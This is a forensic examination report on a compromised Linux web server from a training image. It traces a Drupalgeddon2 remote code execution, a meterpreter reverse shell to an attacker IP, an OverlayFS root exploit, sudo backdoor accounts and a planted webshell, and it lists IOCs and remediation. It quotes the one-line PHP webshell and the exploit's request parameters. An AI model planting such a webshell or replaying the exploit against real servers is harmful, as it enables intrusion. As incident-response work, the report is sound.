# AH-L01 — Compromised Linux web server (VulnOSv2)

Examiner: Halil Ozturkci (swarm s9d83).  
Evidence: `inputs/Webserver.E01` (EWF of a VMware disk; MD5 `03e4a40ebaf6071b346fb2bf217a9f3b`, SHA256 `0975892d0a8edc8ff1ef42c15115928edcfbe8b7ba2e600b70399e07eca280ca`). Root EXT4 is LVM LV `VulnOSv2-vg/root` at **sector offset 503808** (`PV 501760 + pe_start 2048`; `fsstat` Ext4, last mounted on `/`). All `fls`/`icat`/`istat` citations use `-o 503808` unless noted.

Guest TZ: **Europe/Brussels** (`/etc/timezone` inode 1831949). Apache timestamps `+0200` (CEST). Convert guest local → UTC by −2 h. TSK on this examiner prints +03; those instants match Apache +0200 after −3 h. Dated facts are in `ledger/ledger.md`; the merged table is `work/timeline.md`.

Host: Ubuntu 14.04.4 LTS (`lsb-release`), hostname `VulnOSv2`, kernel **3.13.0-24-generic**, Apache 2.4.7 / PHP 5.5.9, Drupal **7.26** at `/var/www/html/jabc`, OpenDocMan at `/jabcd0cs`. Victim IP **192.168.210.135**. Attacker IP **192.168.210.131**.

---

## 1. How did the threat actor gain access?

**Unauthenticated remote code execution on Drupal 7.26 (CVE-2018-7600 / SA-CORE-2018-002, “Drupalgeddon2”), not SSH.**

SSH brute force of `root` from 192.168.210.131 **failed** (~450 `Failed password for root` lines in `/var/log/auth.log` inode 525608, 12:39:27–12:52:52 CEST / 10:39:27–10:52:52Z). There is no `Accepted password for root` from that IP on 2019-10-05. `PermitRootLogin yes` (`/etc/ssh/sshd_config`) is a pre-existing misconfiguration, not the Oct 5 entry.

First evidence of the actor:

| UTC | What | Evidence |
| --- | --- | --- |
| 2019-10-05 09:48:56Z | `GET /` Firefox/60 from 192.168.210.131 | access.log inode **526420** `[05/Oct/2019:11:48:56 +0200]` |
| 10:34:35Z | Browse `/jabc/` (referer `http://192.168.210.135/`) | same log |
| 11:01:27Z | POST `/jabc/?q=user/password&name[#post_render][]=assert&name[#markup]=eval(base64_decode(…))` User-Agent `MSIE 6.0` (Metasploit) | same; HTTP 200 |
| 11:01:29Z | POST same form with `#post_render[]=passthru` and `php -r 'eval(base64_decode(…))'` HTTP 200 size 14021 | same; `/etc/alternatives/php` atime 11:01:29 UTC (FTK CSV) |

`includes/bootstrap.inc` inode **528098** contains `define('VERSION', '7.26');`. 7.26 is unpatched for CVE-2018-7600 (fixed in 7.58) and also for CVE-2014-3704 (fixed in 7.32). The **observed** exploit is the 2018 Form API `#post_render` RCE, not the 2014 SQLi. `CHANGELOG.txt` 404s because Debian/Ubuntu packages Drupal under `/usr` and hide the changelog in the webroot.

Decoded POST body (`work/extracted/s9d8301/decoded_revshell.php`, SHA256 `1ec68f77ede92baaad766a4a5b26a4af2c6dd139912e03e04ada7693c5820109`) is **php/meterpreter/reverse_tcp** to **192.168.210.131:4444** (`error_reporting(0); $ip='192.168.210.131'; $port=4444; stream_socket_client/fsockopen/socket_create … eval($b)`). PHP Notices in error.log inode **526419** show the `assert` path did not fully eval; the `passthru` + CLI `php -r` path at 11:01:29Z is the working implant.

OpenDocMan `/jabcd0cs` was not requested by 192.168.210.131 on Oct 5.

Ledger: findings seq 36, 47, 58; events seq 29, 31, 35, 42, 45, 46.

---

## 2. What privileges were obtained, and how?

**www-data (Apache/PHP) via Drupal RCE, then root via OverlayFS local privilege escalation (CVE-2015-1328 / Exploit-DB 37292) on kernel 3.13.0-24, then reusable root via `sudo` backdoor accounts.**

1. **www-data.** Drupal runs as the Apache worker. The 11:01:29Z `passthru`/`php -r` payload is a reverse shell as the web user. Confirmed by leftover exploit binary ownership.

2. **Root via OverlayFS (CVE-2015-1328).** Ubuntu 14.04 kernel 3.13.0-24-generic is the classic target of `37292.c` (`ofs` / `ns_sploit` / `ld.so.preload` overlay of `/proc/sys/kernel` and AppArmor). Evidence:
   - `/tmp/apache-xTRhUVX` inode **1177371**, ELF 32-bit LSB, **uid/gid 33/33 (www-data)**, created **2019-10-05 11:04:14Z** (FTK UTC; istat 14:04:14 +03). SHA256 `f2d840baa18ddace10b750203709d477d8695c79f0735a9696e85b0db0ae2aa7`. Strings: `overlayfs`, `/tmp/ns_sploit`, `ld.so.preload`, `/tmp/ofs-lib.c`.
   - Deleted `/tmp` names (fls inode 1177346): `ofs-lib.so`, gcc temps `ccOOU3I8.c`, `ccK6FJ39.s`, `sh-thd-*`.
   - `/root/.bash_history` inode **1453814**: `cd /tmp/` then `rm 37292.c`.
   - Two minutes later, **root** on pts/0 with `PWD=/tmp` runs `useradd` (auth.log 13:06:38 CEST / 11:06:38Z). That is only possible after the overlayfs exploit.

3. **Root via sudo (after persistence).** `%sudo ALL=(ALL:ALL) ALL` is stock (`/etc/sudoers` inode 1831928). After `mail` is given a password, bash, and sudo, SSH as `mail` from 192.168.210.131 at 11:13:53Z followed by `sudo su -` at 11:14:04Z yields an interactive root shell (auth.log). Repeated 11:19:21Z, 11:21:11Z, 11:21:30Z, 11:23:39Z.

The webshell inode **529914** is **uid 0**, written 11:17:42Z — ~16 minutes after meterpreter and ~13 minutes after the OverlayFS ELF — so the `update.php` drop is a **root** action, not www-data.

Ledger: findings seq 37, 57, 70, 75.

---

## 3. What modifications were applied?

| Change | Evidence |
| --- | --- |
| Backdoor user `php` UID 999, home `/usr/php`, shell `/bin/bash`, group `sudo` | auth.log `useradd[2525]` 13:06:38; `/etc/passwd` inode **1835260**; `/etc/group` inode **1835269** `sudo:x:27:php,mail` |
| Password hashes for `php` and `mail` (shadow day **18174** = 2019-10-05) | `/etc/shadow` inode **1834279**; `chpasswd`/`passwd` in auth.log |
| `mail` shell `nologin` → `/bin/bash`; added to `sudo` | `chsh[2536]`, `usermod[2561]`; `passwd-` inode 1837534 still has mail nologin |
| Webshell `/var/www/html/jabc/scripts/update.php` (31 B, `<?php system($_GET['cmd']); ?>`) | inode **529914** uid 0; SHA256 `3408a646a1e4323dc3adb9c14e133d8dd0af4d262309dfc29eff85b3d6211ad9`; `/jabc/scripts` world-writable from original 2016 install |
| Deleted `.update.php.swp` | fls realloc inode 527879 |
| OverlayFS ELF left in `/tmp`; `37292.c` and `ofs-lib.so` deleted | inode 1177371; fls `/tmp`; root history |
| `/root/flag.txt` written (CTF banner: JABC fully compromised) | inode **1453827** |
| Histories: root, mail | inodes 1453814, 527879 |
| `vim /var/log/lastlog` and `vim /etc/passwd` (anti-forensics / inspection) | root `.bash_history` |
| No Oct 5 package installs, no new cron/systemd units, no SSH `authorized_keys` | crontab inode 1831568 stock; rc.local 1831847 `exit 0`; no `.ssh` dirs in `/root`, `/usr/php`, `/var/mail`, `/home/*` |

`/etc/passwd` places `php` between `uucp` and `proxy` (UID 999) — not an end-of-file append only; root edited the file (`vim /etc/passwd` in history).

---

## 4. What persistence mechanisms are in place?

Live persistence (no kernel module, no cron, no systemd unit, no SSH keys):

1. **User `php`** — system account UID 999, `/bin/bash`, password set 11:21:39Z, **sudo**, home `/usr/php` (skel only). Intended SSH/sudo backdoor (`passwd php` in both root and mail histories).
2. **User `mail`** — UID 8 reused: interactive shell, password, **sudo**. Four SSH sessions from 192.168.210.131 (ports 57686, 57704, 57706, 57708) each followed by `sudo su -`.
3. **Webshell** `GET /jabc/scripts/update.php?cmd=` (tested `cmd=ls` 11:17:54Z). Directory `/var/www/html/jabc/scripts` is writable (mode 777 from the 2016 Drupal layout).
4. **Pre-existing risk, not planted on Oct 5:** `PermitRootLogin yes`; Drupal 7.26; world-writable scripts dir; kernel 3.13 OverlayFS.

Not used: `/etc/rc.local` (stock), `/etc/crontab` and `/etc/cron.d` (stock Drupal/php5 jobs only), authorized_keys, new inetd/xinetd, new SUID binaries beyond the leftover `/tmp/apache-xTRhUVX` (not a persistence mechanism; leftover exploit).

Ledger: finding seq 59.

---

## 5. Could this system be cleaned or recovered?

**Not as a trustworthy production host.** Treat as rebuild.

Why in-place “clean” is insufficient:

- Kernel 3.13.0-24 on Ubuntu 14.04 is past EOL and **locally rootable** (CVE-2015-1328). Any remaining www-data RCE becomes root again.
- Drupal 7.26 is years behind 7.58+; Form API RCE remains if the tree is reused.
- Two sudo backdoors plus a uid-0 webshell; lastlog was opened in vim; unknown commands after meterpreter are only partially in bash_history.
- `/tmp` still holds the exploit ELF. fsstat orphans 1177350–1177356 are size-0 mysql files at boot, not the gcc temps (those are inodes 1177373–1177379, unlinked).

Minimum if rebuild is delayed (still not “clean”):

- Take the host offline; snapshot first (already have E01).
- Delete inode 529914 `update.php`; chmod scripts/; remove `/tmp/apache-xTRhUVX` and any `/tmp/ns_sploit`.
- `userdel -r php`; restore `mail` to `/usr/sbin/nologin` and lock the password (`*`).
- Rotate **all** password hashes (root, vulnosadmin, webmin, mail, php) and SSH host keys.
- Patch or replace Drupal (or take `/jabc` down); audit OpenDocMan `jabcd0cs`.
- Set `PermitRootLogin no`, restrict sudo, upgrade the OS/kernel.

EXT4 journal inode 8 (128 MiB) retains directory entries for `37292.c` / `ofs-lib.c` / `ns_sploit`; the C source body was **not** recovered (EXT4 zeros block pointers on unlink). The live ELF strings plus `rm 37292.c` in root history are sufficient to identify CVE-2015-1328.

---

## 6. Notes, recommendations, and examiner notes

**Kill chain (2019-10-05, CEST then UTC in `work/timeline.md`):** recon HTTP → failed SSH brute of root → Drupalgeddon2 meterpreter as www-data → OverlayFS 37292 to root → `useradd php` + weaponize `mail` → SSH as mail / sudo su - → drop webshell → `passwd php` → `rm 37292.c` / inspect lastlog.

**Timezone trap:** several early ledger rows subtracted 3 h from guest local (examiner TSK +03). **Correct conversion is −2 h from auth.log/apache local.** Apache `+0200` and FTK UTC agree. This report and `work/timeline.md` use −2 h.

**IOCs**

| Type | Value |
| --- | --- |
| Attacker IPv4 | 192.168.210.131 |
| Victim IPv4 | 192.168.210.135 |
| C2 | tcp/4444 meterpreter |
| Webshell | `/var/www/html/jabc/scripts/update.php` inode 529914 SHA256 `3408a646a1e4323dc3adb9c14e133d8dd0af4d262309dfc29eff85b3d6211ad9` |
| Exploit ELF | `/tmp/apache-xTRhUVX` inode 1177371 SHA256 `f2d840baa18ddace10b750203709d477d8695c79f0735a9696e85b0db0ae2aa7` |
| Accounts | `php` UID 999; `mail` UID 8 with bash+sudo |
| UA | Metasploit `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)` on the exploit POSTs; Firefox/60 on recon |

**Recommendations:** rebuild on a supported kernel; WAF/update Drupal before exposing Form API; disable PHP `passthru`/`system`/`eval` in php.ini if the app allows; `PermitRootLogin no`; do not put service accounts (`mail`) in `sudo`; monitor `useradd`/`usermod`/`chsh`; directory listing of `/jabc/scripts/` helped the actor find `update.php` after planting it.

**Image geometry:** mmls slot 006 Linux LVM 501760–66064383; `/boot` Ext at sector 2048 (catalog `p2048`, kernel 3.13.0-24-generic). Acquisition Ali Hadi / FTK 3.4.2.2 on 2019-10-06 (`inputs/Webserver.E01.txt`). `check_inputs` confirmed `inputs/` unchanged.

**Peer extracts:** `work/extracted/` (passwd, shadow, group, auth.log, apache logs, histories); `work/extracted/s9d8301/` (Q1 decode + webshell); `work/s9d8303/FINDINGS.md`; `work/s9d8300/q1-web-access.md`. Cite `ledger/ledger.md` for the event list.

**Hypothesis (labelled):** exact interactive commands between meterpreter 11:01:29Z and `useradd` 11:06:38Z are not fully logged (www-data has no bash_history). The OverlayFS ELF at 11:04:14Z owned by www-data is the bridge; that is evidence, not a guess.
